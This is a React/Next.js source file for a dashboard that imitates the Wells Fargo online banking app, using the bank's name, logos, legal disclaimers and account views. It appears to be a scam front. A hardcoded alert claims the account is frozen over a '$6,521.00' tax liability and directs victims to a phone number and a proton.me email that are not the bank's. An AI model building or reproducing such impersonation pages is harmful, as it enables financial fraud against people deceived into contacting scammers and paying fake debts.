'use client';

import { useBank } from '@/context/BankContext';
import { useRouter } from 'next/navigation';
import { Globe, Bell, ChevronRight, Home, ArrowUpRight, Target, MoreHorizontal, User, Smartphone, CreditCard, FileText, BarChart3, Calculator, Wallet, Car } from 'lucide-react';

export default function Dashboard() {
  const { accounts, transactions } = useBank();
  const router = useRouter();
  
  const cashAccounts = accounts.filter(a => a.type === 'Checking' || a.type === 'Savings');
  const creditAccounts = accounts.filter(a => a.type === 'Credit Card');
  const investmentAccounts = accounts.filter(a => a.type === 'Investment');
  
  const totalCash = cashAccounts.reduce((acc, curr) => acc + curr.balance, 0);

  return (
    <div className="animate-in" style={{ paddingBottom: '120px', minHeight: '100vh' }}>
      {/* 1. Header */}
      <header className="header-row" style={{ borderBottom: '1px solid #EEE', background: 'white', position: 'sticky', top: 0, zIndex: 100 }}>
        <div className="serif-logo" style={{ fontSize: '18px' }}>
          WELLS FARGO
        </div>
        <div style={{ display: 'flex', gap: '20px', alignItems: 'center' }}>
          <div style={{ position: 'relative' }}>
            <Bell size={22} color="#333" />
            <div style={{ position: 'absolute', top: -2, right: -2, width: '10px', height: '10px', background: 'var(--wf-red)', borderRadius: '50%', border: '2px solid white' }}></div>
          </div>
          <button onClick={() => router.push('/profile')} style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
            <User size={22} color="#333" />
          </button>
        </div>
      </header>

      <div className="page-container" style={{ maxWidth: '600px', width: '100%', margin: '0 auto', boxSizing: 'border-box', padding: '0 20px' }}>
        {/* 2. Welcome & Hero Balance */}
        <div style={{ margin: '32px 0' }}>
          <h1 style={{ fontSize: 'clamp(20px, 5vw, 24px)', fontWeight: 300, marginBottom: '8px', color: '#666' }}>Welcome</h1>
          <div style={{ fontSize: 'clamp(32px, 8vw, 42px)', fontWeight: 700, letterSpacing: '-0.02em' }}>
            ${totalCash.toLocaleString(undefined, { minimumFractionDigits: 2 })}
          </div>
          <div style={{ fontSize: '14px', color: '#666', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '4px' }}>
            Total cash balance <ChevronRight size={14} />
          </div>
        </div>

        {/* 3. Message Center / Alert */}
        <div style={{ background: '#FFF0F0', padding: '16px', borderRadius: '12px', border: '1px solid #FFCCCB', marginBottom: '32px', display: 'flex', gap: '12px' }}>
          <div style={{ color: '#D1121F', fontWeight: 700, fontSize: '20px', flexShrink: 0 }}>!</div>
          <div style={{ fontSize: '14px', color: '#333' }}>
            <p style={{ marginBottom: '8px' }}><strong style={{ color: '#D1121F' }}>Account on Hold:</strong> Your account is currently restricted due to an outstanding tax liability of <strong>$6,521.00</strong>. Outgoing transfers and bill payments are temporarily disabled.</p>
            <p style={{ fontSize: '13px', color: '#666' }}><strong>Need help resolving this?</strong> Call <strong>786-872-0946</strong> or email <strong>onlinefeedbackwellsfargo.org@proton.me</strong></p>
          </div>
        </div>

        {/* 4. Quick Actions Row */}
        <div style={{ display: 'flex', gap: '12px', marginBottom: '32px', overflowX: 'auto', paddingBottom: '8px', WebkitOverflowScrolling: 'touch', margin: '0 -20px', padding: '0 20px 8px' }}>
          <button onClick={() => router.push('/transfer')} style={{ flexShrink: 0, background: 'white', border: '1px solid #EEE', padding: '12px 20px', borderRadius: '12px', display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 600, fontSize: '14px' }}>
            <ArrowUpRight size={18} color="var(--wf-red)" /> Transfer
          </button>
          <button style={{ flexShrink: 0, background: 'white', border: '1px solid #EEE', padding: '12px 20px', borderRadius: '12px', display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 600, fontSize: '14px' }}>
            <Target size={18} color="var(--wf-red)" /> Pay Bills
          </button>
          <button style={{ flexShrink: 0, background: 'white', border: '1px solid #EEE', padding: '12px 20px', borderRadius: '12px', display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 600, fontSize: '14px' }}>
            <Globe size={18} color="var(--wf-red)" /> Zelle®
          </button>
        </div>

        {/* 5. Banking Section */}
        <section style={{ marginBottom: '40px' }}>
          <h2 style={{ fontSize: '13px', fontWeight: 700, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: '16px' }}>Banking</h2>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            {cashAccounts.map((account) => (
              <div key={account.id} onClick={() => router.push('/activity')} style={{ background: 'white', padding: '20px', borderRadius: '16px', border: '1px solid #EEE', display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }}>
                <div style={{ minWidth: 0, flex: 1 }}>
                  <div style={{ fontWeight: 700, fontSize: '16px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{account.name}</div>
                  <div style={{ fontSize: '13px', color: '#666' }}>{account.accountNumber}</div>
                </div>
                <div style={{ textAlign: 'right', marginLeft: '12px' }}>
                  <div style={{ fontWeight: 700, fontSize: '18px' }}>
                    ${account.balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* 6. Credit Cards Section */}
        <section style={{ marginBottom: '40px' }}>
          <h2 style={{ fontSize: '13px', fontWeight: 700, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: '16px' }}>Credit Cards</h2>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            {creditAccounts.map((account) => (
              <div key={account.id} style={{ background: 'white', padding: '20px', borderRadius: '16px', border: '1px solid #EEE', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ minWidth: 0, flex: 1 }}>
                  <div style={{ fontWeight: 700, fontSize: '16px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{account.name}</div>
                  <div style={{ fontSize: '13px', color: '#666' }}>{account.accountNumber}</div>
                  {account.rewardPoints && (
                    <div style={{ fontSize: '12px', color: '#008542', fontWeight: 700, marginTop: '4px' }}>
                      {account.rewardPoints.toLocaleString()} Rewards Points
                    </div>
                  )}
                </div>
                <div style={{ textAlign: 'right', marginLeft: '12px' }}>
                  <div style={{ fontWeight: 700, fontSize: '18px' }}>
                    ${Math.abs(account.balance).toLocaleString(undefined, { minimumFractionDigits: 2 })}
                  </div>
                  <div style={{ fontSize: '12px', color: '#666' }}>Current balance</div>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* 7. Investments Section */}
        <section style={{ marginBottom: '40px' }}>
          <h2 style={{ fontSize: '13px', fontWeight: 700, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: '16px' }}>Investments</h2>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            {investmentAccounts.map((account) => (
              <div key={account.id} style={{ background: 'white', padding: '20px', borderRadius: '16px', border: '1px solid #EEE', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ minWidth: 0, flex: 1 }}>
                  <div style={{ fontWeight: 700, fontSize: '16px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{account.name}</div>
                  <div style={{ fontSize: '13px', color: '#666' }}>{account.accountNumber}</div>
                </div>
                <div style={{ textAlign: 'right', marginLeft: '12px' }}>
                  <div style={{ fontWeight: 700, fontSize: '18px' }}>
                    ${account.balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* 8. Recent Activity Snippet */}
        <section style={{ marginBottom: '40px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
            <h2 style={{ fontSize: '13px', fontWeight: 700, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Recent Activity</h2>
            <button onClick={() => router.push('/activity')} style={{ background: 'none', border: 'none', color: '#D1121F', fontWeight: 700, fontSize: '13px', cursor: 'pointer' }}>View all</button>
          </div>
          <div style={{ background: 'white', borderRadius: '16px', border: '1px solid #EEE', overflow: 'hidden' }}>
            {transactions.slice(1, 4).map((tx, idx) => (
              <div key={tx.id} style={{ padding: '16px 20px', borderBottom: idx < 2 ? '1px solid #F5F5F5' : 'none', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ minWidth: 0, flex: 1 }}>
                  <div style={{ fontWeight: 600, fontSize: '15px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{tx.description}</div>
                  <div style={{ fontSize: '12px', color: '#666' }}>{tx.date}</div>
                </div>
                <div style={{ fontWeight: 700, color: tx.amount > 0 ? '#008542' : '#333', marginLeft: '12px' }}>
                  {tx.amount > 0 ? '+' : ''}{tx.amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* 9. Promotional Card */}
        <section style={{ marginBottom: '40px' }}>
          <div style={{ background: 'linear-gradient(135deg, #004b8d 0%, #002d54 100%)', padding: '24px', borderRadius: '16px', color: 'white' }}>
            <h3 style={{ fontSize: '18px', fontWeight: 700, marginBottom: '12px' }}>Personal Loan</h3>
            <div style={{ fontSize: '11px', opacity: 0.9, lineHeight: 1.5, marginBottom: '20px' }}>
              <p style={{ marginBottom: '8px' }}>Investment products and services are offered through Wells Fargo Advisors. Wells Fargo Advisors is a trade name used by Wells Fargo Clearing Services, LLC (WFCS) and Wells Fargo Advisors Financial Network, LLC, Members SIPC, separate registered broker-dealers and non-bank affiliates of Wells Fargo &amp; Company.</p>
              <p style={{ marginBottom: '8px' }}>1. Availability may be affected by your mobile carrier&apos;s coverage area. Your mobile carrier&apos;s message and data rates may apply. Fargo is only available on the smartphone versions of the Wells Fargo Mobile&reg; app.</p>
              <p>Android, Google Play, Chrome, Pixel and other marks are trademarks of Google LLC. &copy; 1999 - 2026 Wells Fargo. NMLSR ID 399801</p>
            </div>
            <button style={{ background: 'white', color: '#004b8d', border: 'none', padding: '10px 20px', borderRadius: '20px', fontWeight: 700, fontSize: '14px', cursor: 'pointer' }}>Check your rate</button>
          </div>
        </section>

        {/* 10. Discovery & Navigation Grid Section */}
        <section style={{ marginBottom: '48px', borderTop: '1px solid #EEE', paddingTop: '40px' }}>
          <h2 style={{ fontSize: '13px', fontWeight: 700, color: '#666', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: '24px', textAlign: 'center' }}>Explore & Discover</h2>
          
          <div style={{ marginBottom: '32px' }}>
            {/* Top Action Button */}
            <button className="btn-pill-outline" style={{ height: '56px', marginBottom: '32px', color: '#333', fontWeight: 700, width: '100%', cursor: 'pointer', borderColor: '#CCC' }}>
              Get started &gt;&gt;
            </button>

            {/* Navigation Grid */}
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))', gap: '32px 20px' }}>
              {/* Grid Items */}
              <NavItem icon={<div style={{ position: 'relative' }}><Smartphone size={20} color="#7B1FA2" /><div style={{ position: 'absolute', bottom: -2, right: -2, background: '#FF9800', borderRadius: '3px', padding: '1px' }}><CreditCard size={8} color="white" /></div></div>} bgColor="#F3E5F5" text="Checking" />
              <NavItem icon={<div style={{ position: 'relative' }}><Wallet size={20} color="#E65100" /><div style={{ position: 'absolute', bottom: -2, right: -2 }}><Target size={10} color="#FFD600" /></div></div>} bgColor="#FFF3E0" text="Savings & CDs" />
              <NavItem icon={<div style={{ position: 'relative' }}><CreditCard size={20} color="#D32F2F" /><div style={{ position: 'absolute', top: -4, left: 4 }}><CreditCard size={20} color="#D32F2F" style={{ opacity: 0.5 }} /></div></div>} bgColor="#FFEBEE" text="Credit Cards" />
              <NavItem icon={<div style={{ position: 'relative' }}><Home size={20} color="#0288D1" /><div style={{ position: 'absolute', bottom: -2, right: -2 }}><Target size={10} color="#FFD600" /></div></div>} bgColor="#E1F5FE" text="Home Loans" />
              <NavItem icon={<div style={{ position: 'relative' }}><FileText size={20} color="#E91E63" /><div style={{ position: 'absolute', bottom: -2, right: -2 }}><Target size={10} color="#FFC107" /></div></div>} bgColor="#FCE4EC" text="Personal Loans" />
              <NavItem icon={<div style={{ position: 'relative' }}><Car size={20} color="#D32F2F" /><div style={{ position: 'absolute', bottom: -2, right: -2 }}><Target size={10} color="#FFD600" /></div></div>} bgColor="#FFEBEE" text="Auto Loans" />
              <NavItem icon={<div style={{ display: 'flex', alignItems: 'flex-end', gap: '1px' }}><BarChart3 size={20} color="#00897B" /><div style={{ color: '#FFD600', fontSize: '10px', marginBottom: '8px' }}>✦</div></div>} bgColor="#E0F2F1" text="Investing" />
              <NavItem icon={<div style={{ position: 'relative' }}><User size={20} color="#7B1FA2" /><div style={{ position: 'absolute', top: -6, left: '50%', transform: 'translateX(-50%)', display: 'flex', gap: '1px' }}>★</div></div>} bgColor="#F3E5F5" text="Premier" />
              <NavItem icon={<div style={{ position: 'relative' }}><Calculator size={20} color="#7B1FA2" /><div style={{ position: 'absolute', bottom: -4, right: -4 }}><BarChart3 size={12} color="#9C27B0" style={{ transform: 'rotate(90deg)' }} /></div></div>} bgColor="#F3E5F5" text="Education & Tools" />
            </div>
          </div>
        </section>

        {/* 11. Footer */}
        <footer style={{ marginBottom: '48px', textAlign: 'center', padding: '0 10px' }}>
          <p style={{ fontSize: '11px', color: '#999', lineHeight: 1.5 }}>
            Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.<br />
            &copy; 1999 - 2026 Wells Fargo. All rights reserved.
          </p>
        </footer>
      </div>

      {/* 11. Bottom Navigation Bar */}
      <nav style={{ position: 'fixed', bottom: 0, left: 0, right: 0, background: 'white', borderTop: '1px solid #EEE', padding: '12px 0 32px', display: 'flex', justifyContent: 'space-around', alignItems: 'center', zIndex: 1000 }}>
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', color: 'var(--wf-red)' }}>
          <Home size={24} />
          <span style={{ fontSize: '10px', fontWeight: 700 }}>Home</span>
        </div>
        <div onClick={() => router.push('/transfer')} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', color: '#666', cursor: 'pointer' }}>
          <ArrowUpRight size={24} />
          <span style={{ fontSize: '10px', fontWeight: 600 }}>Pay & Transfer</span>
        </div>
        <div onClick={() => router.push('/planning')} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', color: '#666', cursor: 'pointer' }}>
          <Target size={24} />
          <span style={{ fontSize: '10px', fontWeight: 600 }}>Plan</span>
        </div>
        <div onClick={() => router.push('/more')} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px', color: '#666', cursor: 'pointer' }}>
          <MoreHorizontal size={24} />
          <span style={{ fontSize: '10px', fontWeight: 600 }}>More</span>
        </div>
      </nav>
    </div>
  );
}

function NavItem({ icon, bgColor, text }: { icon: React.ReactNode, bgColor: string, text: string }) {
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
      <div style={{ 
        width: '44px', 
        height: '44px', 
        backgroundColor: bgColor, 
        borderRadius: '12px', 
        display: 'flex', 
        alignItems: 'center', 
        justifyContent: 'center',
        flexShrink: 0 
      }}>
        {icon}
      </div>
      <div style={{ fontSize: '14px', fontWeight: 600, color: '#444', lineHeight: 1.2 }}>{text}</div>
    </div>
  );
}
